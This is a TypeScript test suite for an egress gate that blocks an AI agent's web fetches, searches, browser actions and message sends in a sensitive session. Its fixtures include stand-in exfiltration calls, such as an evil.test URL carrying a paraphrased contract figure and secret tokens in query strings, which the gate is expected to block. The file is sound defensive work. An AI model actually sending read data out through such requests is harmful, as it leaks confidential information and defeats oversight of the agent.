/**
 * net-gate.test — the HIGH-SESSION network gate on tool_use (Plan 8, §4).
 *
 * The property under test is the one that justifies the whole watermark:
 *
 *     A PARAPHRASE CARRIES NO SYMBOL.
 *
 * `desymbolizationDecision` is per-SYMBOL, so it is structurally blind to a
 * WebFetch whose URL contains a secret the model READ and then reworded. There
 * is no `$MDU:*` token in it to gate. Only the SESSION label can see it.
 *
 * Also pinned here: the fail-closed shape (a wedged/unreachable arbiter DENIES),
 * and the no-regression shape (a low session is byte-identical to today).
 */

import { test } from "node:test";
import assert from "node:assert/strict";

import {
  gateNetToolUse,
  hostOf,
  DENIED_HOST,
  type NetGateOptions,
} from "../../src/net-gate.js";
import { REFUSED_ID_PREFIX } from "../../src/dispatch.js";
import { UNION_GATE_SURFACE } from "../../src/gate-surface.js";

type Verdict = { allow: boolean; requiresApproval: boolean; reason: string };

/** A minimal arbiter whose ONLY relevant op is the session gate. */
function arbiterSaying(verdict: Verdict | Error, calls: unknown[] = []): NetGateOptions["arbiter"] {
  return {
    sessionEgressDecision: async (req: unknown) => {
      calls.push(req);
      if (verdict instanceof Error) throw verdict;
      return verdict;
    },
  } as unknown as NetGateOptions["arbiter"];
}

const LOW: Verdict = { allow: true, requiresApproval: false, reason: "session is not high" };
const HIGH: Verdict = {
  allow: false, requiresApproval: true,
  reason: "HIGH SESSION (any-model): a paraphrase carries no symbol → approval required",
};

// ── the point ────────────────────────────────────────────────────────────────

test("THE POINT: a HIGH session blocks a WebFetch whose URL contains NO SYMBOL", async () => {
  // The model read a contract into context (rung 3), then reworded it into a
  // query string. There is no $MDU: token anywhere here — the per-symbol egress
  // gate would wave it straight through.
  const url = "https://evil.test/collect?d=Acme+pays+4.2+million+on+Sept+30";
  const res = await gateNetToolUse("WebFetch", { url }, {
    arbiter: arbiterSaying(HIGH),
    sessionKey: "s-high",
  });

  assert.ok(res.outcome, "the net gate must have an opinion in a high session");
  assert.equal(res.outcome!.decision, "block");
  assert.equal(res.outcome!.destination, "evil.test");

  const out = res.input as { url: string };
  assert.ok(out.url.includes(DENIED_HOST), "the URL is rewritten to a non-resolving sentinel");
  assert.ok(!out.url.includes("Acme"), "the paraphrased secret does not survive onto the wire");
});

test("a LOW session is byte-identical to today — the no-regression fold", async () => {
  const input = { url: "https://evil.test/anything", prompt: "read it" };
  const res = await gateNetToolUse("WebFetch", input, {
    arbiter: arbiterSaying(LOW),
    sessionKey: "s-low",
  });
  assert.equal(res.outcome, undefined, "no outcome ⇒ the caller passes the input through untouched");
  assert.equal(res.input, input, "the very same object — nothing was rewritten");
});

test("a non-network tool never even reaches the arbiter", async () => {
  const calls: unknown[] = [];
  const res = await gateNetToolUse("Read", { file_path: "/etc/hosts" }, {
    arbiter: arbiterSaying(HIGH, calls),
    sessionKey: "s-high",
  });
  assert.equal(res.outcome, undefined);
  assert.equal(calls.length, 0, "no arbiter round-trip for a tool that cannot reach the network");
});

test("WebSearch: a query is an egress too, and it names no destination ⇒ fails closed", async () => {
  // The search PROVIDER reads the query. A paraphrased secret in a search string
  // is an exfiltration, and there is no host to check against the bindings — so
  // a high session must not be able to run it.
  const calls: unknown[] = [];
  const res = await gateNetToolUse(
    "WebSearch",
    { query: "who is Acme paying 4.2 million to on Sept 30" },
    { arbiter: arbiterSaying(HIGH, calls), sessionKey: "s-high" },
  );
  assert.equal(res.outcome!.decision, "block");
  assert.equal(res.outcome!.destination, null);
  assert.equal((calls[0] as { destination?: string }).destination, undefined,
    "no destination is claimed — the arbiter fails closed on an unprovable sink");
  assert.ok(!JSON.stringify(res.input).includes("Acme"), "the query does not survive");
});

test("a BOUND destination in a high session is allowed through", async () => {
  const bound: Verdict = { allow: true, requiresApproval: false, reason: "bound destination" };
  const input = { url: "https://api.docs.corp/v1/upload" };
  const res = await gateNetToolUse("WebFetch", input, {
    arbiter: arbiterSaying(bound),
    sessionKey: "s-high",
  });
  assert.equal(res.outcome, undefined, "the read data's own standing release rule still holds");
  assert.equal(res.input, input);
});

// ── fail-closed ──────────────────────────────────────────────────────────────

test("an UNREACHABLE arbiter DENIES — 'we could not check' is never 'go ahead'", async () => {
  const res = await gateNetToolUse("WebFetch", { url: "https://evil.test/x" }, {
    arbiter: arbiterSaying(new Error("connect ENOENT")),
    sessionKey: "s-high",
  });
  assert.equal(res.outcome!.decision, "block");
  assert.match(res.outcome!.reason, /fail closed/i);
  assert.ok((res.input as { url: string }).url.includes(DENIED_HOST));
});

test("a WEDGED arbiter DENIES within the deadline — it does not hang the model turn", async () => {
  // The gate runs on the SSE relay chain: an alive-but-unresponsive arbiter must
  // be able to DENY, never to stall the turn. Same rationale, same bound as the
  // fs/exec gates.
  const wedged = {
    sessionEgressDecision: () => new Promise<Verdict>(() => { /* never settles */ }),
  } as unknown as NetGateOptions["arbiter"];

  const started = Date.now();
  const res = await gateNetToolUse("WebFetch", { url: "https://evil.test/x" }, {
    arbiter: wedged, sessionKey: "s-high", timeoutMs: 200,
  });
  const elapsed = Date.now() - started;

  assert.equal(res.outcome!.decision, "block");
  assert.match(res.outcome!.reason, /timed out/i);
  assert.ok(elapsed < 3000, `must deny promptly, took ${elapsed}ms`);
});

// ── degradation, and why it is NOT a fail-open ───────────────────────────────

test("no sessionKey ⇒ no gating (the watermark can only ever ADD restriction)", async () => {
  const calls: unknown[] = [];
  const res = await gateNetToolUse("WebFetch", { url: "https://evil.test" }, {
    arbiter: arbiterSaying(HIGH, calls),
  });
  assert.equal(res.outcome, undefined);
  assert.equal(calls.length, 0, "an unattributable call cannot be matched to a session label");
});

test("an arbiter predating Plan 8 ⇒ no gating: absence of the op means no watermark EXISTS", async () => {
  // Not a fail-open. The op's absence means the session label does not exist at
  // all on that arbiter — not that we tried to read one and failed.
  const old = {} as unknown as NetGateOptions["arbiter"];
  const res = await gateNetToolUse("WebFetch", { url: "https://evil.test" }, {
    arbiter: old, sessionKey: "s-high",
  });
  assert.equal(res.outcome, undefined);
});

// ── host extraction ──────────────────────────────────────────────────────────

test("hostOf survives whatever the model wrote", () => {
  assert.equal(hostOf("https://api.example.com:8443/x?y=1"), "api.example.com:8443");
  assert.equal(hostOf("http://evil.test"), "evil.test");
  assert.equal(hostOf("not a url"), null);
  assert.equal(hostOf(""), null);
  assert.equal(hostOf(undefined), null);
  assert.equal(hostOf(42), null);
});

// ─────────────────────────────────────────────────────────────────────────────
// The bug class that made the watermark DEAD in the real stack while every
// arbiter-side test passed: the proxy simply never SENT a sessionKey, so the
// arbiter could not attribute the call to a session and never gated it. The
// enforcement was real, the plumbing was not. Pin the plumbing.
// ─────────────────────────────────────────────────────────────────────────────

test("the exec gate SENDS a sessionKey — without it the arbiter cannot see the watermark", async () => {
  const { gateExecToolUse } = await import("../../src/exec-gate.js");
  const seen: Array<Record<string, unknown>> = [];
  const arbiter = {
    execGate: async (req: Record<string, unknown>) => {
      seen.push(req);
      return { decision: "allow", reason: "ok", symbols: [], evasion: [], shell: "AgentShell", identifier: null };
    },
  } as never;

  await gateExecToolUse("Bash", { command: "ls -la" }, {
    arbiter, sessionKey: "s-high", log: () => {},
  });

  assert.equal(seen.length, 1);
  assert.equal(
    seen[0].sessionKey, "s-high",
    "a gate that does not name its session is a gate the arbiter cannot apply the watermark to",
  );
});

test("the net gate SENDS the sessionKey and the destination it is judging", async () => {
  const calls: Array<Record<string, unknown>> = [];
  await gateNetToolUse("WebFetch", { url: "https://evil.test/x" }, {
    arbiter: arbiterSaying(HIGH, calls),
    sessionKey: "s-high",
  });
  assert.equal(calls[0].sessionKey, "s-high");
  assert.equal(calls[0].boundary, "network");
  assert.equal(calls[0].destination, "evil.test");
});

// ── history restoration ──────────────────────────────────────────────────────

import { NetGateHistory, NET_GATE_HISTORY_MAX } from "../../src/net-gate.js";

const historyOf = (input: unknown, id = "tu_1") => ({
  messages: [
    { role: "user", content: "go" },
    { role: "assistant", content: [{ type: "text", text: "ok" }, { type: "tool_use", id, name: "WebFetch", input }] },
  ],
});

test("history: a blocked call is restored to the input the MODEL wrote (watch C7, 2026-09-20)", async () => {
  const asked = { url: "https://httpbin.org/get?note=hello", prompt: "p" };
  const r = await gateNetToolUse("WebFetch", asked, { arbiter: arbiterSaying(HIGH), sessionKey: "s" });
  const h = new NetGateHistory();
  h.remember("tu_1", asked, r.input);
  const req = historyOf(structuredClone(r.input));
  assert.deepEqual(h.restore(req), ["tu_1"]);
  assert.deepEqual(req.messages[1]!.content[1], { type: "tool_use", id: "tu_1", name: "WebFetch", input: asked });
  // idempotent: a second pass finds nothing left to restore
  assert.deepEqual(h.restore(req), []);
});

test("history: only a block this proxy blocked, in the exact form it produced, is touched", async () => {
  const asked = { url: "https://httpbin.org/", prompt: "p" };
  const r = await gateNetToolUse("WebFetch", asked, { arbiter: arbiterSaying(HIGH), sessionKey: "s" });
  const h = new NetGateHistory();
  h.remember("tu_1", asked, r.input);
  // same sentinel under an id we never blocked
  const foreign = historyOf(structuredClone(r.input), "tu_other");
  assert.deepEqual(h.restore(foreign), []);
  // our id, but the input is no longer the rewrite we produced
  const edited = historyOf({ ...(r.input as object), prompt: "edited" });
  assert.deepEqual(h.restore(edited), []);
  assert.equal((edited.messages[1]!.content[1] as { input: { prompt: string } }).input.prompt, "edited");
  // user-role blocks and malformed bodies are ignored, never thrown on
  assert.deepEqual(h.restore({ messages: [{ role: "user", content: [{ type: "tool_use", id: "tu_1", input: r.input }] }] }), []);
  for (const junk of [null, 1, {}, { messages: "x" }, { messages: [null, { role: "assistant", content: [null] }] }]) {
    assert.deepEqual(h.restore(junk), []);
  }
});

test("history: WebSearch's neutralized query is restored too; no callId ⇒ nothing remembered; the map is bounded", async () => {
  const asked = { query: "acme deal terms" };
  const r = await gateNetToolUse("WebSearch", asked, { arbiter: arbiterSaying(HIGH), sessionKey: "s" });
  const h = new NetGateHistory();
  h.remember(undefined, asked, r.input);
  assert.deepEqual(h.restore(historyOf(structuredClone(r.input))), []);
  h.remember("tu_1", asked, r.input);
  const req = historyOf(structuredClone(r.input));
  h.restore(req);
  assert.deepEqual((req.messages[1]!.content[1] as { input: unknown }).input, asked);
  for (let i = 0; i < NET_GATE_HISTORY_MAX + 5; i++) h.remember(`x${i}`, asked, r.input);
  assert.deepEqual(h.restore(historyOf(structuredClone(r.input))), [], "the oldest entry was dropped");
});

// ── the per-symbol leg (2026-09-21) ──────────────────────────────────────────
// Live watch C9/C13: a secret symbol inside a WebFetch URL left as the literal
// token through the TLS tunnel — never released at its bound host, never
// refused at the unbound one. The flow is now JUDGED, per symbol, at `network`.

type Desym = { allow: boolean; requiresApproval?: boolean; reason: string; ruleRef?: { source: string; id: string } };
const SECRET = "$MDU:nomodel_Read[1f08].__mdu_field_002e0065006e0076";

function symbolArbiter(
  decide: (req: { symbol: string; destination?: string }) => Desym | Error,
  calls: unknown[] = [],
  session: Verdict = LOW,
): NetGateOptions["arbiter"] {
  return {
    sessionEgressDecision: async () => session,
    desymbolizationDecision: async (req: { symbol: string; destination?: string }) => {
      calls.push(req);
      const d = decide(req);
      if (d instanceof Error) throw d;
      return d;
    },
  } as unknown as NetGateOptions["arbiter"];
}

const BOUND_ONLY = (req: { destination?: string }): Desym =>
  req.destination === "example.com"
    ? { allow: true, reason: "bound", ruleRef: { source: "rule", id: "egress:secret-bound-trusted" } }
    : { allow: false, requiresApproval: true, reason: `secret symbol at UNBOUND destination '${req.destination}'`, ruleRef: { source: "rule", id: "egress:secret-unbound" } };

test("symbol leg: a secret symbol in a WebFetch URL to an UNBOUND host is blocked with the arbiter's rule", async () => {
  const calls: any[] = [];
  const res = await gateNetToolUse("WebFetch", { url: `https://httpbin.org/get?token=${SECRET}`, prompt: "what came back" }, {
    arbiter: symbolArbiter(BOUND_ONLY, calls), sessionKey: "s",
  });
  assert.equal(res.outcome?.decision, "block");
  assert.equal(res.outcome?.ruleRef?.id, "egress:secret-unbound");
  assert.equal(res.outcome?.destination, "httpbin.org");
  // A pre-check (arbiter-human-plane.md §10.3): the net-proxy spends an Allow once on the wire.
  assert.deepEqual(calls, [{ symbol: SECRET, boundary: "network", destination: "httpbin.org", asCommand: false, preflight: true, sessionKey: "s" }]);
  const out = res.input as { url: string; prompt: string };
  assert.equal(out.url, `https://${DENIED_HOST}/symbol-egress-requires-approval`);
  assert.ok(!JSON.stringify(out).includes("$MDU:"), "the symbol does not ride on to the client");
  assert.equal(out.prompt, "what came back");
});

test("symbol leg: ALLOWED at the bound host — passes WITH its symbol under TLS inspection, blocked with the reason without it", async () => {
  const url = `https://example.com/archive?token=${SECRET}`;
  const inspected = await gateNetToolUse("WebFetch", { url }, { arbiter: symbolArbiter(BOUND_ONLY), sessionKey: "s", tlsInspected: true });
  assert.equal(inspected.outcome, undefined);
  assert.deepEqual(inspected.input, { url }, "the net-proxy releases it on the decrypted request; the model wire keeps the symbol");

  const tunnel = await gateNetToolUse("WebFetch", { url }, { arbiter: symbolArbiter(BOUND_ONLY), sessionKey: "s" });
  assert.equal(tunnel.outcome?.decision, "block");
  assert.equal(tunnel.outcome?.ruleRef?.id, "proxy:symbol-in-tls-tunnel");
  assert.match(tunnel.outcome!.reason, /Nothing was sent/);
  assert.match((tunnel.input as { url: string }).url, /symbol-cannot-be-released-inside-this-tools-https-request$/);
});

test("symbol leg: never resolves a value, runs with NO session, and only after the session leg allowed", async () => {
  const calls: any[] = [];
  const noSession = await gateNetToolUse("WebFetch", { url: `https://httpbin.org/?t=${SECRET}` }, { arbiter: symbolArbiter(BOUND_ONLY, calls) });
  assert.equal(noSession.outcome?.decision, "block", "an unattributable call is still judged per symbol");
  assert.equal("sessionKey" in calls[0], false);

  const highCalls: any[] = [];
  const high = await gateNetToolUse("WebFetch", { url: `https://example.com/?t=${SECRET}` }, {
    arbiter: symbolArbiter(BOUND_ONLY, highCalls, HIGH), sessionKey: "s-high", tlsInspected: true,
  });
  assert.equal(high.outcome?.decision, "block");
  assert.match((high.input as { url: string }).url, /high-session-egress-requires-approval$/);
  assert.equal(highCalls.length, 0, "a session block is final; no symbol is put to the arbiter");
});

test("symbol leg FAIL-CLOSED: a throwing / wedged / op-less arbiter and an over-bound call all BLOCK", async () => {
  const url = `https://example.com/?t=${SECRET}`;
  const thrown = await gateNetToolUse("WebFetch", { url }, { arbiter: symbolArbiter(() => new Error("boom")), sessionKey: "s", tlsInspected: true });
  assert.equal(thrown.outcome?.ruleRef?.id, "proxy:arbiter-unreachable");

  const wedged = {
    sessionEgressDecision: async () => LOW,
    desymbolizationDecision: () => new Promise(() => { /* never settles */ }),
  } as unknown as NetGateOptions["arbiter"];
  const t = await gateNetToolUse("WebFetch", { url }, { arbiter: wedged, sessionKey: "s", timeoutMs: 20, tlsInspected: true });
  assert.equal(t.outcome?.decision, "block");
  assert.match(t.outcome!.reason, /timed out/);

  const opless = await gateNetToolUse("WebFetch", { url }, { arbiter: arbiterSaying(LOW), sessionKey: "s", tlsInspected: true });
  assert.equal(opless.outcome?.decision, "block", "a symbol is present and nothing can judge it");

  const many = Array.from({ length: 17 }, (_, i) => `$MDU:Read[${(0x1000 + i).toString(16)}].x`).join(",");
  const calls: unknown[] = [];
  const over = await gateNetToolUse("WebFetch", { url: `https://example.com/?t=${many}` }, { arbiter: symbolArbiter(BOUND_ONLY, calls), sessionKey: "s", tlsInspected: true });
  assert.equal(over.outcome?.ruleRef?.id, "proxy:net-gate-symbol-bound");
  assert.equal(calls.length, 0);
});

test("symbol leg: WebSearch query is judged with NO destination; symbol-free and unknown-token calls are untouched", async () => {
  const calls: any[] = [];
  const denyNoDest = (req: { destination?: string }): Desym =>
    req.destination ? { allow: true, reason: "x" } : { allow: false, requiresApproval: true, reason: "secret symbol with no destination", ruleRef: { source: "rule", id: "egress:secret-unknown-destination" } };
  const ws = await gateNetToolUse("WebSearch", { query: `who owns ${SECRET}` }, { arbiter: symbolArbiter(denyNoDest, calls), sessionKey: "s" });
  assert.equal(ws.outcome?.decision, "block");
  assert.equal("destination" in calls[0], false);
  assert.ok(!(ws.input as { query: string }).query.includes("$MDU:"));

  const none: unknown[] = [];
  const plain = await gateNetToolUse("WebFetch", { url: "https://example.com/docs" }, { arbiter: symbolArbiter(BOUND_ONLY, none), sessionKey: "s" });
  assert.equal(plain.outcome, undefined);
  assert.equal(none.length, 0, "no symbol ⇒ no arbiter round-trip");

  // a symbol in `prompt` goes to the client's summarizer call, not to the host
  const prompt = await gateNetToolUse("WebFetch", { url: "https://example.com/", prompt: `compare with ${SECRET}` }, { arbiter: symbolArbiter(BOUND_ONLY, none), sessionKey: "s" });
  assert.equal(prompt.outcome, undefined);

  const unknown = (): Desym => ({ allow: true, reason: "unknown symbol — no-op", ruleRef: { source: "rule", id: "egress:unknown-symbol" } });
  const u = await gateNetToolUse("WebFetch", { url: "https://example.com/?q=$MDU:Read[ffff].nope" }, { arbiter: symbolArbiter(unknown), sessionKey: "s" });
  assert.equal(u.outcome, undefined, "a token the arbiter never allocated is text, not a datum");
});

// ── a block that refuses the WHOLE input (`block: "refuse"`) ─────────────────
// OpenClaw's full-profile senders (supported-agents.md §2.1): rewriting one
// field would leave the rest acting (a browser that types, a message with a
// `media` attachment, a generator that uploads its reference image), so a
// block replaces the whole input with one the tool's schema rejects.

const SENDERS = {
  message: { destination: null, symbols: "message", block: "refuse" as const },
  browser: { destination: "targetUrl", symbols: "targetUrl", block: "refuse" as const },
  web_search: { destination: null, symbols: "query" },
};

test("block: refuse — a HIGH session's message send becomes {action: mandu-refused…}; no field of the model's input survives", async () => {
  const input = { action: "send", channel: "telegram", message: "the contract says 4.2 million", media: "/home/u/contract.pdf" };
  const res = await gateNetToolUse("message", input, { arbiter: arbiterSaying(HIGH), sessionKey: "s", netTools: SENDERS });
  assert.equal(res.outcome?.decision, "block");
  const out = res.input as Record<string, unknown>;
  assert.deepEqual(Object.keys(out), ["action"]);
  assert.ok(String(out["action"]).startsWith(REFUSED_ID_PREFIX));
  assert.ok(!JSON.stringify(out).includes("4.2 million") && !JSON.stringify(out).includes("contract.pdf"));
});

test("block: refuse — a browser act with no URL in a HIGH session is refused whole (control: a field-rewrite tool keeps its other keys)", async () => {
  const act = { action: "act", kind: "type", ref: "e12", text: "Acme pays 4.2M", submit: true };
  const res = await gateNetToolUse("browser", act, { arbiter: arbiterSaying(HIGH), sessionKey: "s", netTools: SENDERS });
  assert.deepEqual(Object.keys(res.input as object), ["action"]);
  const search = await gateNetToolUse("web_search", { query: "q", count: 3 }, { arbiter: arbiterSaying(HIGH), sessionKey: "s", netTools: SENDERS });
  assert.equal((search.input as Record<string, unknown>)["count"], 3, "control: the query rewrite keeps the other keys");
});

test("block: refuse — a symbol in the payload blocks too (the per-symbol leg), and an unreachable arbiter refuses; a low session passes byte-identical", async () => {
  const sym = await gateNetToolUse("message", { action: "send", message: "see $MDU:read[a1b2c3]" }, {
    arbiter: { ...arbiterSaying(LOW), desymbolizationDecision: async () => ({ allow: false, requiresApproval: true, reason: "untrusted symbol to an unknown destination" }) } as unknown as NetGateOptions["arbiter"],
    sessionKey: "s", netTools: SENDERS,
  });
  assert.deepEqual(Object.keys(sym.input as object), ["action"]);
  const down = await gateNetToolUse("message", { action: "send", message: "hi" }, { arbiter: arbiterSaying(new Error("ECONNREFUSED")), sessionKey: "s", netTools: SENDERS });
  assert.deepEqual(Object.keys(down.input as object), ["action"]);
  const input = { action: "send", message: "hi" };
  const low = await gateNetToolUse("message", input, { arbiter: arbiterSaying(LOW), sessionKey: "s", netTools: SENDERS });
  assert.equal(low.input, input);
});

// ── further destinations (OpenClaw browser `url`, image / view_image refs) ──
//
// The gate-surface residue (supported-agents.md §5.5 item 4): a tool that names where
// it goes in more than one field (NetToolFields.alsoDestinations).

const RESIDUE = {
  browser: { destination: "targetUrl", symbols: "targetUrl", alsoDestinations: ["url"], block: "refuse" as const },
  image: { destination: null, symbols: "prompt", alsoDestinations: ["image", "images"], block: "refuse" as const },
  fetchish: { destination: "url", symbols: "url", alsoDestinations: ["mirrors"] },
};
const SYM2 = "$MDU:nomodel_read[a1b2c3]";

/** An arbiter that allows every host but `evil.test` in the session leg, and
 *  denies any symbol headed anywhere but `docs.corp`. Records its calls. */
function hostArbiter(calls: { session: unknown[]; symbol: unknown[] }): NetGateOptions["arbiter"] {
  return {
    sessionEgressDecision: async (req: { destination?: string }) => {
      calls.session.push(req.destination ?? null);
      return req.destination === "evil.test" ? HIGH : LOW;
    },
    desymbolizationDecision: async (req: { symbol: string; destination?: string }) => {
      calls.symbol.push([req.symbol, req.destination ?? null]);
      return req.destination === "docs.corp"
        ? { allow: true, requiresApproval: false, reason: "bound", ruleRef: { source: "policy", id: "egress:bound" } }
        : { allow: false, requiresApproval: true, reason: "secret symbol to an unbound destination" };
    },
  } as unknown as NetGateOptions["arbiter"];
}

test("further destinations: browser `url` (the field it reads when targetUrl is absent) is checked by the session leg and scanned for symbols", async () => {
  const calls = { session: [] as unknown[], symbol: [] as unknown[] };
  const nav = await gateNetToolUse("browser", { action: "navigate", url: "https://evil.test/p" }, { arbiter: hostArbiter(calls), sessionKey: "s", netTools: RESIDUE });
  assert.equal(nav.outcome?.decision, "block");
  assert.equal(nav.outcome?.destination, "evil.test");
  assert.deepEqual(Object.keys(nav.input as object), ["action"], "refused whole");
  assert.deepEqual(calls.session, [null, "evil.test"], "the primary field (absent: no destination), then the url host");
  // a symbol in `url` at a destination the session leg allows is judged by the per-symbol leg
  const calls2 = { session: [] as unknown[], symbol: [] as unknown[] };
  const sym = await gateNetToolUse("browser", { action: "navigate", url: `https://paste.test/?k=${SYM2}` }, { arbiter: hostArbiter(calls2), sessionKey: "s", netTools: RESIDUE });
  assert.equal(sym.outcome?.decision, "block");
  assert.deepEqual(calls2.symbol, [[SYM2, "paste.test"]], "judged at the url's own host");
  // control: the same symbol headed to its bound host passes where the proxy can release it
  const ok = await gateNetToolUse("browser", { action: "navigate", url: `https://docs.corp/?k=${SYM2}` }, { arbiter: hostArbiter({ session: [], symbol: [] }), sessionKey: "s", netTools: RESIDUE, tlsInspected: true });
  assert.equal(ok.outcome, undefined);
});

test("further destinations: image references — every http(s) host is checked, a local path or data: URL names none, and a symbol in any reference is judged at its host", async () => {
  const calls = { session: [] as unknown[], symbol: [] as unknown[] };
  const input = { prompt: "what is this", image: "/home/u/pic.png", images: ["https://cdn.test/a.png", "data:image/png;base64,AAAA", "https://cdn.test/b.png", 7] };
  const r = await gateNetToolUse("image", input, { arbiter: hostArbiter(calls), sessionKey: "s", netTools: RESIDUE });
  assert.equal(r.outcome, undefined, "no symbol, every host allowed");
  assert.equal(r.input, input, "byte-identical");
  assert.deepEqual(calls.session, [null, "cdn.test"], "the provider leg (no destination), then each distinct host once");
  const evil = await gateNetToolUse("image", { images: ["https://cdn.test/a.png", "https://evil.test/x.png"] }, { arbiter: hostArbiter({ session: [], symbol: [] }), sessionKey: "s", netTools: RESIDUE });
  assert.equal(evil.outcome?.decision, "block");
  assert.equal(evil.outcome?.destination, "evil.test");
  assert.ok((evil.input as Record<string, string>)["action"]!.startsWith(REFUSED_ID_PREFIX));
  const calls2 = { session: [] as unknown[], symbol: [] as unknown[] };
  const sym = await gateNetToolUse("image", { image: `https://cdn.test/a.png?d=${SYM2}` }, { arbiter: hostArbiter(calls2), sessionKey: "s", netTools: RESIDUE });
  assert.equal(sym.outcome?.decision, "block");
  assert.deepEqual(calls2.symbol, [[SYM2, "cdn.test"]]);
});

test("further destinations: FAIL-CLOSED — a value the gate cannot read, more hosts than the bound, an unreachable arbiter, an arbiter without the symbol op", async () => {
  const calls = { session: [] as unknown[], symbol: [] as unknown[] };
  const odd = await gateNetToolUse("image", { images: { url: "https://evil.test" } }, { arbiter: hostArbiter(calls), sessionKey: "s", netTools: RESIDUE });
  assert.equal(odd.outcome?.decision, "block");
  assert.equal(odd.outcome?.ruleRef?.id, "proxy:net-gate-unreadable");
  assert.deepEqual(calls.session, [], "blocked before any arbiter call");
  const many = Array.from({ length: 21 }, (_, i) => `https://h${i}.test/x.png`);
  const bound = await gateNetToolUse("image", { images: many }, { arbiter: hostArbiter({ session: [], symbol: [] }), sessionKey: "s", netTools: RESIDUE });
  assert.equal(bound.outcome?.ruleRef?.id, "proxy:net-gate-destination-bound");
  const down = await gateNetToolUse("image", { image: "https://cdn.test/a.png" }, { arbiter: arbiterSaying(new Error("ECONNREFUSED")), sessionKey: "s", netTools: RESIDUE });
  assert.equal(down.outcome?.decision, "block");
  assert.equal(down.outcome?.ruleRef?.id, "proxy:arbiter-unreachable");
  assert.deepEqual(Object.keys(down.input as object), ["action"]);
  // no session: the per-symbol leg still reads the further fields, and fails closed without the op
  const noOp = await gateNetToolUse("image", { images: [`https://cdn.test/?${SYM2}`] }, { arbiter: {} as NetGateOptions["arbiter"], netTools: RESIDUE });
  assert.equal(noOp.outcome?.decision, "block");
});

test("further destinations: a field-rewrite tool sends its further fields to the sentinel too (a string stays a string, a list becomes one sentinel)", async () => {
  const r = await gateNetToolUse("fetchish", { url: "https://a.test", mirrors: ["https://evil.test/1", "https://evil.test/2"], keep: 1 }, { arbiter: hostArbiter({ session: [], symbol: [] }), sessionKey: "s", netTools: RESIDUE });
  assert.equal(r.outcome?.decision, "block");
  const out = r.input as Record<string, unknown>;
  assert.ok(String(out["url"]).includes(DENIED_HOST));
  assert.equal((out["mirrors"] as string[]).length, 1);
  assert.ok((out["mirrors"] as string[])[0]!.includes(DENIED_HOST));
  assert.equal(out["keep"], 1);
});

test("the union carries the residue's further destinations: browser url, image and view_image references", () => {
  assert.deepEqual(UNION_GATE_SURFACE.net["browser"]!.alsoDestinations, ["url"]);
  assert.deepEqual(UNION_GATE_SURFACE.net["image"], { destination: null, symbols: "prompt", alsoDestinations: ["image", "images"], block: "refuse" });
  assert.deepEqual(UNION_GATE_SURFACE.net["view_image"]!.alsoDestinations, ["path", "paths"]);
  assert.equal(UNION_GATE_SURFACE.net["WebFetch"]!.alsoDestinations, undefined, "Claude Code's entries unchanged");
});

test("the union marks every OpenClaw full-profile sender block: refuse", () => {
  for (const t of ["message", "show_widget", "x_search", "code_execution", "image_generate", "music_generate", "video_generate", "tts", "pdf", "browser"]) {
    assert.equal(UNION_GATE_SURFACE.net[t]?.block, "refuse", t);
  }
  assert.equal(UNION_GATE_SURFACE.net["WebSearch"]!.block, undefined);
});
